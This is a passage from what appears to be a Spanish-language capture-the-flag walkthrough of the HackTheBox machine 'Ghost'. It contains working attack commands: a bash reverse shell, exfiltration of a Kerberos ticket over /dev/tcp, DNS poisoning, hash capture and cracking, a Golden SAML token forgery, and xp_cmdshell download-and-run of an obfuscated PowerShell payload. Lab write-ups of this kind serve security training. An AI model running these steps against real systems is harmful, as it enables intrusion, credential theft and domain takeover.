curl -s -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{ "url": "test; id" }' | jq
{
  "is_safe": true,
  "temp_command_success": true,
  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
}
~~~

Podemos ver que se ejecuta correctamente el comando que hemos inyectado. El próximo paso lógicamente es abusar de esta funcionalidad para ganar acceso al sistema, como una `reverse shell`

~~~ bash
curl -sX POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{ "url": "test; bash -i >&/dev/tcp/10.10.14.53/443 0>&1" }'

---------------------------------------------------------------------------------

nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.11.24] 49820
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app\# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.

root@36b733906694:/app\# ^Z # Ctrl + >
[1]  + 95450 suspended  nc -lvnp 443

root@parrot ghost \# stty raw -echo;fg[1]  + 95450 continued  nc -lvnp 443
                                    reset xterm
root@36b733906694:/app\# export TERM=xterm 
~~~


## Host Analysis

Si vemos la dirección IP que tiene asignada esta máquina, vemos que no estamos en la dirección IP de la máquina `Windows`, sino que estamos dentro de lo que parece ser un contenedor de `docker`

~~~ bash
root@36b733906694:/app\# hostname -I

172.18.0.3
~~~

Si vemos el archivo `/etc/hosts`, podemos apreciar que existe una dirección IP con el nombre `windows-host`

~~~ bash
root@36b733906694:/app\# cat /etc/hosts

127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
10.0.0.254	windows-host
172.18.0.3	36b733906694
~~~


## Abusing SSH Multiplexing

Investigando servicios y archivos de la máquina, vemos que existe un script de `bash` en la raíz con el nombre de `docker-entrypoint.sh`

~~~ bash
root@36b733906694:/app\# ls /
app  boot  docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var
bin  dev   etc			lib   media  opt  root  sbin  sys  usr

root@36b733906694:/app\# cat /docker-entrypoint.sh

#!/bin/bash

mkdir /root/.ssh
mkdir /root/.ssh/controlmaster
printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes' > /root/.ssh/config

exec /app/ghost_intranet
~~~

Parece ser que este script hace uso de `SSH Multiplexing`, que básicamente se reutiliza una conexión SSH y así poder establecer múltiples sesiones a través de sockets

~~~ bash
cat /root/.ssh/config; echo
Host *
  ControlMaster auto
  ControlPath ~/.ssh/controlmaster/%r@%h:%p
  ControlPersist yes


ls -l controlmaster/
total 0
srw------- 1 root root 0 Feb 20 10:04 florence.ramirez@ghost.htb@dev-workstation:22
~~~

- `Controlmaster auto`: Habilitar la reutilización de conexiones sin necesidad de autenticación (multiplexación)
- `ControlPath`: Ruta del socket utilizado para compartir conexiones
- `ControlPersist yes`: Mantiene el socket abierto aunque las conexiones no estén activas

Dentro del directorio `controlmaster` se almacenarían estas conexiones activas hacia un host, estas se definen en un socket con la sintaxis `usuario@host:puerto`. 

En este caso existe un socket hacia `ghost.htb@dev-workstation` por el puerto `22` como el usuario `florence.ramirez `

Sabiendo como funciona este concepto, podremos conectarnos sin proporcionar credenciales con el siguiente comando

~~~ bash
ssh -S ~/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 florence.ramirez@ghost.htb@dev-workstation   
Last login: Thu Feb 20 20:15:58 2025 from 172.18.0.3
florence.ramirez@LINUX-DEV-WS01:~$ 
~~~

Si listamos la IP de la máquina vemos que estamos en otro contenedor dentro de la misma subred

~~~ bash
florence.ramirez@LINUX-DEV-WS01:~$ hostname -I
172.18.0.2
~~~

Si examinamos el archivo `/etc/hosts` podremos notar que la IP `10.0.0.254` ya hace referencia al Domain Controller

~~~ bash
cat /etc/hosts 
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
10.0.0.254	windows-host dc01.ghost.htb ghost.htb
172.18.0.2	LINUX-DEV-WS01
~~~


## Stealing Kerberos Ticket Granting Ticket

Dado que estamos en un dominio de Active Directory, revisaremos si tenemos tickets `kerberos` almacenados en esta máquina con el comando `klist`

~~~ bash
florence.ramirez@LINUX-DEV-WS01:~$ klist
Ticket cache: FILE:/tmp/krb5cc_50
Default principal: florence.ramirez@GHOST.HTB

Valid starting     Expires            Service principal
02/20/25 22:07:01  02/21/25 08:07:01  krbtgt/GHOST.HTB@GHOST.HTB
	renew until 02/21/25 22:07:01
~~~

Tenemos credenciales almacenadas en un archivo de caché para el usuario `florence.ramirez` en la ruta `/tmp/krb5cc_50`, podemos robar este ticket y enviarlo a nuestra máquina con el siguiente comando

~~~
cat /tmp/krb5cc_50 > /dev/tcp/10.10.14.119/8000
~~~

Debemos tener el puerto `8000` a la escucha antes de desplegar el comando anterior. Entonces recibiremos el TGT a través de una conexión TCP

~~~ bash
nc -lvnp 8000 > krb5cc_50
listening on [any] 8000 ...
connect to [10.10.14.128] from (UNKNOWN) [10.10.11.24] 49826
~~~

Opcionalmente podemos validar el hash MD5 del archivo para comprobar la integridad del mismo en ambas máquinas con el siguiente comando

~~~ bash
md5sum krb5cc_50
e83a516c3ac2b463d7c1ac904adfcd41  krb5cc_50
~~~


## Bloodhound Analysis

Como ya tenemos credenciales válidas a nivel de dominio, podemos hacer uso de herramientas como `BloodHound` para recolectar información del dominio y ver posibles vías para escalar privilegios

~~~ bash
bloodhound-python -d ghost.htb -c All -ns 10.10.11.24 --zip -k -u florence.ramirez -no-pass --use-ldap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ghost.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 16 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: linux-dev-ws01.ghost.htb
INFO: Querying computer: DC01.ghost.htb
WARNING: Could not resolve: linux-dev-ws01.ghost.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.10.11.24@53 answered The DNS operation timed out.
INFO: Done in 00M 48S
INFO: Compressing output into 20250222092258_bloodhound.zip
~~~

Subiremos el archivo generado por el comando anterior a `Bloodhound`, para lanzar `bloodhound` podemos hacerlo de la siguiente manera

~~~ bash
sudo neo4j console &>/dev/null & disown
bloodhound &>/dev/null & disown
~~~

Si vemos el mapa de confianza de dominios, podemos ver que existe un dominio `corp.ghost.htb`, esta información nos servirá mas adelante

![image-center](/assets/images/posts/ghost-bloodhound-domain-map.png){: .align-center}

## ADIDNS Poisoning

Recordemos que en el foro un usuario menciona que el dominio `bitbucket` no funciona, podemos aprovechar esto para envenenar la red e inyectar un `DNS Record`
 
![image-center](/assets/images/posts/ghost-adidns-poisoning.png){: .align-center}

Agregaremos el registro DNS con el nombre `bitbucket` al dominio

~~~ bash
python3 dnstool.py -u 'ghost.htb\florence.ramirez' -k --record 'bitbucket.ghost.htb' --action add --data '10.10.14.128' -dns-ip 10.10.11.24 dc01.ghost.htb

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
~~~

Hemos inyectado el registro DNS correctamente, podemos ver el registro agregado con `dig`

~~~ bash
dig @10.10.11.24 bitbucket.ghost.htb 

; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> @10.10.11.24 bitbucket.ghost.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 660
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;bitbucket.ghost.htb.		IN	A

;; ANSWER SECTION:
bitbucket.ghost.htb.	180	IN	A	10.10.14.128

;; Query time: 229 msec
;; SERVER: 10.10.11.24#53(10.10.11.24) (UDP)
;; WHEN: Sat Feb 22 10:54:13 EST 2025
;; MSG SIZE  rcvd: 64
~~~

Vemos que el registro `bitbucket.ghost.htb` apunta a nuestra dirección IP, que en este caso es la `10.10.14.128`


## Stealing NetNTLMv2 Hashes

Como tenemos un registro `DNS` bajo nuestra dirección IP, desplegaremos `responder` para intentar obtener hashes `NetNTLMv2` que podamos crackear de forma offline y así poder autenticarnos más adelante

~~~ bash
responder -I tun0 -dwv

[+] Current Session Variables:
    Responder Machine Name     [WIN-D21MF5VBXAI]
    Responder Domain Name      [JLBT.LOCAL]
    Responder DCE-RPC Port     [45413]

[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.10.11.24
[HTTP] GET request from: ::ffff:10.10.11.24  URL: / 
[HTTP] NTLMv2 Client   : 10.10.11.24
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:9307a2e4abf60e0a:11AD5BE6EFC5719B0DBC7685917345F6:0101000000000000293EEE955185DB016CA7314BAB90F67600000000020008004A004C004200540001001E00570049004E002D004400320031004D004600350056004200580041004900040014004A004C00420054002E004C004F00430041004C0003003400570049004E002D004400320031004D0046003500560042005800410049002E004A004C00420054002E004C004F00430041004C00050014004A004C00420054002E004C004F00430041004C0008003000300000000000000000000000004000009CBDFE76FD8B5AD33F32CCC4531FD8CEA255705548559FACFCDA5E2FE31C765A0A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000
~~~

Hemos capturado un hash `NetNTLMv2`, esto porque el usuario `justin.bradley` está solicitando el recurso `bitbucket.ghost.htb`. Podemos ver la autenticación NTLM con el siguiente comando

~~~ bash
tcpdump -i tun0 'port 80' -vvv                                                     
~~~


## Hash Cracking

Intentaremos romper el hash `NetNTLMv2` para ver la contraseña del usuario `justin.bradley`

~~~ bash
hashcat -a 0 -m 5600 -O NetNTLMv2.txt /usr/share/wordlists/rockyou.txt

Session..........: hashcat
Status...........: Running
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: JUSTIN.BRADLEY::ghost:14292cfb834bca9e:fcab0b7e3022...000000
Time.Started.....: Sat Feb 22 11:21:34 2025 (7 secs)
Time.Estimated...: Sat Feb 22 11:21:52 2025 (11 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   778.4 kH/s (1.89ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 5460483/14344385 (38.07%)
Rejected.........: 2563/5460483 (0.05%)
Restore.Point....: 5460483/14344385 (38.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: mk9008 -> mjqa0126
Hardware.Mon.#1..: Util: 77%

JUSTIN.BRADLEY::ghost:14292cfb834bca9e:fcab0b7e3022f799db75e76dcfd44608:0101000000000000c46bf38c4585db01e254f016d1efea33000000000200080057004f003200300001001e00570049004e002d00430059005100570039004600340056005700480046000400140057004f00320030002e004c004f00430041004c0003003400570049004e002d00430059005100570039004600340056005700480046002e0057004f00320030002e004c004f00430041004c000500140057004f00320030002e004c004f00430041004c0008003000300000000000000000000000004000009cbdfe76fd8b5ad33f32ccc4531fd8cea255705548559facfcda5e2fe31c765a0a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$
~~~


## Shell as `justin.bradley` 

Para validar si este usuario es miembro del grupo `Remote Management Users`, usaremos la herramienta `nxc`

~~~ bash
nxc winrm 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'

WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ (Pwn3d!)
~~~

Como el mensaje es `Pwned!`, significa que podremos conectarnos al dominio con una consola interactiva de `Powershell`

~~~ bash
evil-winrm -i 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'                   
*Evil-WinRM* PS C:\Users\justin.bradley\Documents>
~~~

En este punto ya tenemos capacidad para leer el archivo `user.txt` y validar que hemos comprometido el usuario sin privilegios elevados de esta máquina

~~~ bash
type ..\Desktop\user.txt
~~~



# Escalada de Privilegios
---
## DC Enumeration - BloodHound

Hemos comprometido al usuario `justin.bradley`, analizando BloodHound, podemos ver que tenemos permisos directos sobre la cuenta `adfs_gmsa`

![image-center](/assets/images/posts/ghost-bloodhound-dc-enumeration.png){: .align-center}

## Dumping GMSA Password - `gMSADumper.py`

La cuenta `adfs_gmsa$` es un tipo de cuenta especial que se usa para ejecutar servicios específicos, la contraseña es dinámica y generada por el Controlador de Dominio. Para abusar de este privilegio, `bloodhound` nos sugiere la herramienta `gMSADumper.py` para ver la contraseña de la cuenta `adfs_gmsa$`, poder autenticarnos y hacer un movimiento lateral dentro del dominio

~~~ bash
python3 gMSADumper.py -d ghost.htb -u 'justin.bradley' -p 'Qwertyuiop1234$$'           
Users or groups who can read password for adfs_gmsa$:
 > DC01$
 > justin.bradley
adfs_gmsa$:::0bef...
adfs_gmsa$:aes256-cts-hmac-sha1-96:cd242...
adfs_gmsa$:aes128-cts-hmac-sha1-96:9633bff...
~~~ 

La herramienta nos entregará el equivalente en un hash NT para la cuenta `adfs_gmsa$`


## Shell as `adfs_gmsa` - PassTheHash

Verificaremos que el usuario `adfs_gmsa$` sea parte del grupo `Remote Management Users`, de esta forma podremos acceder con una consola de `Powershell`

~~~ bash
nxc winrm 10.10.11.24 -u 'adfs_gmsa$' -H '0bef7...'
WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:ghost.htb)
WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\adfs_gmsa$:0bef79ae... (Pwn3d!)
~~~

Nos conectaremos con `evil-winrm` a la máquina víctima proporcionando el hash `NT`

~~~ bash
evil-winrm -i 10.10.11.24 -u 'adfs_gmsa$' -H '0bef7...'
~~~


## ADFS Analysis

Intentaremos autenticarnos como el usuario `justin.bradley` en el servicio federado de este dominio, capturaremos las solicitudes y respuestas SAML con Burpsuite

![image-center](/assets/images/posts/ghost-adfs-analysis-1.png){: .align-center}

El servidor nos redirige a `core.ghost.htb`, lo contemplaremos en el archivo `/etc/hosts`, en este punto ya debería verse de la siguiente manera

~~~ bash
cat /etc/hosts | grep ghost.htb

10.10.11.24 ghost.htb DC01.ghost.htb federation.ghost.htb intranet.ghost.htb gitea.ghost.htb core.ghost.htb
~~~

Recargaremos y vemos la siguiente página, al parecer, solo el usuario `Administrator` tiene acceso a este servicio

![image-center](/assets/images/posts/ghost-adfs-analysis-2.png){: .align-center}

## Golden SAML Attack

Crearemos un Token SAML válido para autenticarnos en ADFS (`Active Directory Federation Services`), para lograrlo necesitaremos cierta información acerca de la configuración de ADFS en este dominio

- `TKS Key`, una clave privada usada para firmar los tokens SAML
- `DKM Key`, la clave usada para cifrar/descifrar datos sensibles de los tokens SAML

~~~ bash
*Evil-WinRM* PS C:\Temp> upload ADFSDump.exe
                                        
Info: Uploading /home/incommatose/machines/htb/ghost/exploits/ADFSDump.exe to C:\Temp\ADFSDump.exe
                                        
Data: 40276 bytes of 40276 bytes copied
                                        
Info: Upload successful!
~~~

Ahora ejecutaremos el `ADFSDump.exe` para extraer la información que necesitaremos

~~~ bash
.\ADFSDump.exe
    ___    ____  ___________ ____
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
                                              /_/
Created by @doughsec


## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7


[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1


## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
	AAAAAQAAAAAEEAFyHlNXh2VDska...
[-] Encrypted Token Signing Key End

[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-]
core.ghost.htb
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.ghost.htb:8443
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>


    Access Policy Parameter:

    Issuance Rules: @RuleTemplate = "LdapClaims"
@RuleName = "LdapClaims"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
~~~

Y logramos extraer las dos claves que necesitamos para generar Tokens SAML maliciosos, guardaremos estas claves en dos archivos

> TKSKey.txt

~~~ bash
8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
~~~

> DKMKey.txt

~~~ bash
AAAAAQAAAAAEEAFyHlNXh2VDska8KMTxXboGCWCGSAFlAwQCAQYJYIZIAWUDBAIBBglghkgBZQMEAQIEIN38LpiFTpYLox2V3SL3knZBg16utbeqqwIestbeUG4eBBBJvH3Vzj/Slve2Mo4AmjytIIIQoMESvyRB6RLWIo...
...
...
~~~

Haremos un tratamiento a las claves para poder usarlas en nuestro ataque, más o menos de la siguiente forma

~~~ bash
cat TKSKey.txt | base64 -d > TKSKey.bin 

cat DKMKey.txt | tr -d '-' | xxd -r -p > DKMKey.bin
~~~

### Crafting SAML Token

Procederemos a crear el token haciendo uso de la `TKS Key` para firmar el token, y la `DKM Key` para cifrarlo

Primeramente instalaremos la herramienta `ADFSpoof.py` en nuestro sistema

- https://github.com/mandiant/ADFSpoof

~~~ bash
git clone https://github.com/mandiant/ADFSpoof
cd ADFSpoof
pyhton3 -m venv adfspoof_env
source adfspoof_env/bin/activate
pip install -r requirements.txt
~~~

Ahora con las librerías necesarias instaladas, crearemos el token SAML

~~~ bash
python3 ADFSpoof.py -b ../TKSKey.bin ../DKMKey.bin -s core.ghost.htb saml2 --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'GHOST\administrator' --rpidentifier https://core.ghost.htb:8443 --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>GHOST\administrator</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
~~~

- `--endpoint`: Ruta donde se tramitan las respuestas SAML
- `--nameidformat`: Formato que define cómo se representa el `userID`, es un identificador efímero, en este contexto se usa para generar un Token que aparente ser válido y cumplir con lo que el `Service Provider` espera
- `--rpidentifier`: Identifica para qué servicio se genera el Token SAML
- `--assertions`: Obtendremos este valor de un Token SAML legítimo en la etiqueta `<AttributeStatement>`

Si decodificamos un Token SAML en la siguiente página: https://www.scottbrady.io/tools/saml-parser, podemos ver la información en formato XML, más o menos así se vería la información que necesitamos para ver los atributos que necesitamos modificar

~~~ xml
<samlp:Response>
...
...
...
	<AttributeStatement>
	      <Attribute
	        Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
	        <AttributeValue>GHOST\administrator</AttributeValue>
	      </Attribute>
	      <Attribute
	        Name="http://schemas.xmlsoap.org/claims/CommonName">
	        <AttributeValue>Administrator</AttributeValue>
	      </Attribute>
	    </AttributeStatement>
...
...
</samlp:Response>
~~~

El último paso sería con Burpsuite realizar la siguiente solicitud POST a `/adfs/saml/postResponse` utilizando el token SAML malicioso que hemos creado

![image-center](/assets/images/posts/ghost-golden-saml.png){: .align-center}

En este caso capturamos la respuesta SAML que nos autentica como `justin.bradley` desde el `HTTP History` de Burpsuite, que podemos hacerlo si deshabilitamos la opción `Intercept` en la pestaña de `Proxy`

Aquí es cuando debemos manipular la solicitud para colocar el output del comando `ADFSpoof.py` que contiene el Token SAML que creamos

~~~ bash
POST /adfs/saml/postResponse HTTP/1.1
Host: core.ghost.htb:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Sec-Gpc: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6563

SAMLResponse= # ADFSpoof.py output
~~~

Enviamos la solicitud ingresando la salida del comando `ADFSpoof.py`, que correspondería al Token SAML malicioso firmado y cifrado

![image-center](/assets/images/posts/ghost-adfs-spoofing.png){: .align-center}

Replicaremos la respuesta en el navegador haciendo `Click Derecho > Request in browser > In original session`, copiamos el link e ingresamos con el proxy seleccionado en `FoxyProxy`, más no con `Intercept` habilitado, si ya eres experimentado con este paso, tal vez te asusten las mujeres (como a mi)


## SQL Injection - MSSQL Server

Conseguimos suplantar al usuario `GHOST\Administrator` e ingresar al siguiente servicio bajo el dominio `core.ghost.htb`

![image-center](/assets/images/posts/ghost-mssql-injection.png){: .align-center}

Tenemos potestad para ejecutar consultas SQL dado el servicio al que logramos acceder. Ejecutaremos la siguiente consulta para listar todos servidores vinculados a SQL Server

~~~ sql
select srvname from sysservers;

{
    "recordsets": [
        [
            {
                "srvname": "DC01"
            },
            {
                "srvname": "PRIMARY"
            }
        ]
    ],
    "recordset": [
        {
            "srvname": "DC01"
        },
        {
            "srvname": "PRIMARY"
        }
    ],
    "output": {},
    "rowsAffected": [
        2
    ]
}
~~~

Vemos que existen dos servidores, `DC01` y `PRIMARY`


## Abusing SQL Server - Enabling `xp_cmdshell` to RCE

Intentaremos activar el procedimiento almacenado `xp_cmdshell` para ejecutar comandos en el servidor de forma remota

~~~ bash
EXECUTE('EXECUTE AS LOGIN = ''sa'';EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE; EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE;exec xp_cmdshell ''whoami''') AT [PRIMARY]

{
    "recordsets": [
        [
            {
                "output": "nt service\\mssqlserver"
            },
            {
                "output": null
            }
        ]
    ]
}
~~~ 

Para ejecutar instrucciones que cargaremos desde nuestro lado de atacante, primeramente mantendremos un servidor HTTP a la escucha por un puerto

~~~ bash
python3 -m http.server 80
~~~

Además, pondremos a la escucha en puerto por el cual recibiremos una consola de `powershell`

~~~ bash
rlwrap nc -lvnp 443
~~~


## Reverse Shell (Failed)

Si intentamos enviarnos una reverse shell típica con el siguiente comando, el antivirus bloqueará nuestra consulta

~~~ bash
EXECUTE('EXECUTE AS LOGIN = ''sa'';EXECUTE sp_configure "show advanced options", 1; RECONFIGURE; EXECUTE sp_configure "xp_cmdshell", 1; RECONFIGURE;exec xp_cmdshell "powershell -c IEX(New-Object Net.Webclient).downloadString(''http://10.10.14.89/a.ps1''))"') AT [PRIMARY]
~~~

Modificaremos el payload que ejecutamos para poder hacer `bypass` del antivirus que detecta nuestro script como malicioso

Pondremos un puerto en escucha por el cual recibiremos la consola, en mi caso, el puerto `4646`

~~~ bash
rlwrap nc -lvnp 4646
~~~

Sin embargo no recibiremos la shell porque el antivirus bloquea cierto tipo de comportamiento o solicitudes, necesitaremos hacer un paso más


## Reverse Shell Obfuscation - `PowerJoker`

Con la herramienta `powerjoker` podremos crear un payload en `base64` que esté ofuscado y que envíe una `powershell` a nuestra máquina atacante

~~~ bash
git clone https://github.com/Adkali/PowerJoker.git
cd PowerJoker

# Usamos un entorno virtual para evitar problemas con versiones de librerías que tengamos instaladas
python3 -m venv powerjoker
source powerjoker/bin/activate

# Instalamos las dependencias necesarias
pip3 install -r requirements.txt --break-system-packages
~~~

Procedemos a lanzar la herramienta especificando nuestro puerto en escucha y nuestra IP de HackTheBox

~~~ bash
python3 PowerJoker.py -l 10.10.x.x -p 443
~~~

![image-center](/assets/images/posts/ghost-powershell-obfuscation.png){: .align-center}

- Como ya teníamos el puerto `443` en escucha, el script terminará con un error, esto se debe a que el puerto ya está "ocupado" por `netcat`, si no tenías un puerto a la escucha, el script **iniciará automáticamente una sesión para recibir la conexión**
- Si ejecutamos el script sin permisos administrativos, no se iniciará una sesión interactiva con un puerto a la escucha, esto es irrelevante si hacemos esto de forma manual
- Para salir del entorno virtual, solo debemos ejecutar el comando `deactivate`

**La herramienta nos da un payload que podemos usar para inyectar un comando de `powershell` que interprete esta cadena**

> Guardaremos el payload en un archivo, en mi caso lo llamaré `revBase64.ps1`

Ahora ejecutaremos la sentencia SQL que nos debería dar una `powershell`, **ajustando el tamaño de bytes en el comando a ejecutar dado que existe un límite de 128**

Además usaremos otro comando para enviar la solicitud HTTP a nuestra máquina

~~~ bash
EXECUTE('EXECUTE AS LOGIN = ''sa'';EXECUTE sp_configure "show advanced options", 1; RECONFIGURE; EXECUTE sp_configure "xp_cmdshell", 1; RECONFIGURE;exec xp_cmdshell "powershell -c IEX(IWR -UseBasicParsing ''http://10.10.x.x/revBase64.ps1'')"') AT [PRIMARY]
~~~


### Shell as `nt service\mssqlserver`

Si ejecutamos la consulta anterior con un servidor HTTP activo y el puerto que usamos para enviar la conexión a la escucha, deberíamos recibir la solicitud HTTP por parte de la máquina víctima y por consiguiente la conexión con `powershell`

> `HTTP Server`

~~~ bash
python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.24 - - [04/Mar/2025 21:00:04] "GET /revBase64.ps1 HTTP/1.1" 200 -
~~~

> `Shell`

~~~ bash
rlwrap nc -lvnp 443                                                                                             
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.24] 49808

JokerShell C:\Windows\system32> whoami
nt service\mssqlserver
~~~

Si listamos la IP que tenemos asignada podremos darnos cuenta que no estamos en `10.10.11.24` sino que estamos en otra máquina, en este caso el servidor de base de datos 

~~~ bash
JokerShell C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.0.0.10
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.0.254
~~~


## Abusing SeImpersonatePrivilege - EfsPotato

Si listamos los privilegios vemos que tenemos asignado `SeImpersonatePrivilege`, esto nos permite escalar privilegios suplantando la identidad de un usuario

~~~ bash
JokerShell C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
~~~

Como estamos en un Windows Server 2022, en vez de usar `JuicyPotato` usaremos `EfsPotato`, que explota el servicio EFSRPC (`Encrypted File System RPC`)

~~~ bash
JokerShell C:\Windows\system32> mkdir C:\Temp
JokerShell C:\Windows\system32> cd C:\Temp
JokerShell C:\Temp> wget http://10.10.x.x/EfsPotato.cs -Outfile efsPotato.cs
~~~

Debemos comprobar que el archivo ha sido encontrado y descargado desde nuestro servidor HTTP

~~~ bash
python3 -m http.server 80

